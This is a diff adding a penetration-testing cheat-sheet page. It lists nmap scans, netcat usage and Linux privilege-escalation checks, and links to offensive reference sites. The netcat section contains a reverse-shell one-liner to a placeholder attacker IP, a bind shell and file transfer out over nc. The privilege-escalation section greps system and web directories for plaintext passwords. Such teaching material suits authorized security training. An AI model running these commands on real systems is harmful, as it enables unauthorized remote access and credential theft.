@@ -1,0 +1,129 @@
+---
+title: "Cybersecurity Cheat Sheets and Command Quick References"
+sidebarTitle: "Cheat Sheets"
+description: "Download and bookmark the best cybersecurity cheat sheets for Linux, nmap, Metasploit, Burp Suite, and common penetration testing commands."
+---
+
+No matter how experienced you become, cheat sheets and quick references remain essential companions — during certification exams, live engagements, and CTF competitions where speed matters as much as accuracy. The best practitioners do not memorize every flag and syntax variant; they know where to find reliable references instantly and how to adapt them to the situation in front of them. This page collects the most useful command references you will reach for repeatedly, along with the best external resources the community has built and maintains.
+
+## Command References
+
+### nmap Quick Reference
+
+Use these `nmap` patterns to cover the most common scanning scenarios during enumeration. Always adjust timing and intensity to match your authorized scope.
+
+```bash
+# Service and version detection on common ports
+nmap -sV -sC -oN initial_scan.txt <target>
+
+# OS detection only (requires root/sudo privileges)
+nmap -O -oN os_detection.txt <target>
+
+# Aggressive scan: OS detection, version, scripts, traceroute
+nmap -A -oN aggressive_scan.txt <target>
+
+# Full port scan (all 65535 ports) with service detection
+nmap -sV -p- --min-rate 5000 -oN full_ports.txt <target>
+
+# Vulnerability scan using built-in NSE scripts
+nmap --script vuln -oN vuln_scan.txt <target>
+
+# UDP scan for common services (DNS, SNMP, TFTP)
+nmap -sU -p 53,161,69 -oN udp_scan.txt <target>
+
+# Output all formats simultaneously (normal, XML, grepable)
+nmap -sV -sC -oA scan_results <target>
+```
+
+### Netcat Cheat Sheet
+
+`netcat` (nc) is the Swiss Army knife of networking — useful for transferring files, checking port connectivity, and catching reverse shells during exploitation.
+
+```bash
+# Listen for an incoming connection on a port
+nc -lvnp 4444
+
+# Connect to a remote host and port
+nc <target_ip> 4444
+
+# Send a file to a listening netcat instance
+nc <target_ip> 4444 < /path/to/file.txt
+
+# Receive a file and save it locally
+nc -lvnp 4444 > received_file.txt
+
+# Simple banner grab / port check
+nc -v <target_ip> 80
+
+# Bind shell: execute bash on incoming connection (target side)
+nc -lvnp 4444 -e /bin/bash
+
+# Reverse shell one-liner (attacker listens, target connects back)
+nc <attacker_ip> 4444 -e /bin/bash
+```
+
+### Linux Privilege Escalation Checks
+
+Run these checks immediately after landing a shell to identify local privilege escalation paths. Automate with LinPEAS for a comprehensive sweep, but know the manual checks for when you cannot upload tools.
+
+```bash
+# Check what sudo commands your current user can run
+sudo -l
+
+# Find SUID binaries (executables that run as their owner, often root)
+find / -perm -4000 -type f 2>/dev/null
+
+# Find SGID binaries
+find / -perm -2000 -type f 2>/dev/null
+
+# List all cron jobs (system-wide and user-specific)
+cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l
+
+# Check for writable files owned by root
+find / -writable -user root -type f 2>/dev/null
+
+# View running processes for clues on privileged services
+ps aux | grep root
+
+# Check installed software versions for known CVEs
+dpkg -l          # Debian/Ubuntu
+rpm -qa          # RHEL/CentOS
+
+# Look for plaintext credentials in common config locations
+grep -r "password" /var/www/ /etc/ /home/ 2>/dev/null | grep -v Binary
+
+# Check OS version and kernel for kernel exploits
+uname -a
+cat /etc/os-release
+```
+
+## External Cheat Sheet Resources
+
+The cybersecurity community has produced some extraordinary free references. These are the ones practitioners return to most often.
+
+<CardGroup cols={2}>
+  <Card title="HackTricks" href="https://book.hacktricks.xyz" icon="book">
+    The most comprehensive free hacking reference on the internet. Community-maintained and constantly updated, covering attack techniques for virtually every service, protocol, and platform you will encounter.
+  </Card>
+  <Card title="OWASP Cheat Sheet Series" href="https://cheatsheetseries.owasp.org" icon="list-check">
+    Authoritative security guidance for both developers and testers. Covers secure coding practices, common vulnerability patterns, and testing methodologies — essential for web application penetration testing.
+  </Card>
+  <Card title="PayloadsAllTheThings" href="https://github.com/swisskyrepo/PayloadsAllTheThings" icon="github">
+    A massive, organized collection of payloads and bypass techniques for SQL injection, XSS, file inclusion, command injection, and dozens of other attack categories. An indispensable bookmark for pentesters.
+  </Card>
+  <Card title="GTFOBins" href="https://gtfobins.github.io" icon="terminal">
+    A curated list of Unix binaries that can be exploited by an attacker with limited privileges to break out of restricted environments, escalate privileges, or transfer files.
+  </Card>
+  <Card title="LOLBAS" href="https://lolbas-project.github.io" icon="windows">
+    The Windows equivalent of GTFOBins — Living Off the Land Binaries, Scripts, and Libraries. Documents how native Windows executables can be abused for execution, persistence, and exfiltration.
+  </Card>
+  <Card title="RevShells" href="https://revshells.com" icon="code">
+    An interactive reverse shell generator that produces ready-to-use one-liners in dozens of languages and formats. Specify your IP, port, and shell type — copy and paste, no manual escaping required.
+  </Card>
+</CardGroup>
+
+<Tip>
+  **Bookmark HackTricks as your first stop for any unfamiliar technique or service.** Before spending an hour researching how to exploit a misconfigured NFS mount or enumerate an MSSQL instance, search HackTricks — the methodology, tools, and example commands are almost certainly already there, saving you significant time during exams and live engagements.
+</Tip>
